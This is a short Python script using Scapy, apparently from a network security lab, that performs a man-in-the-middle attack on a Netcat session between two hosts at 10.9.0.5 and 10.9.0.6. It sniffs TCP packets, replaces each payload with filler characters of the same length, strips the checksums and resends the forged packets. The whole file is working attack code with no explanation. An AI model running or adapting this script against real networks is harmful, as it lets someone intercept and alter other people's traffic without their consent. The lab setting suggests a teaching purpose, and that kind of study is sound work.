#!/usr/bin/env python3
from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'

print("MIMT on Netcat")

def spoof_pkt(pkt):
	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
		real = pkt[TCP].payload.load
		data = ""
		for i in range(len(real)):
			data += 'A'
		#data =  real.replace(b'Manik',b'AAAAA')
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload) 
		del(newpkt[TCP].chksum)
		newpkt = newpkt/data
		send(newpkt, verbose = False)
	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP and pkt[TCP].payload:
		real = pkt[TCP].payload.load
		data = ""
		for i in range(len(real)):
			data += 'B'
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload) 
		del(newpkt[TCP].chksum)
		newpkt = newpkt/data
		send(newpkt, verbose = False)
		
pkt = sniff(filter='tcp and not src 10.9.0.101',prn=spoof_pkt)
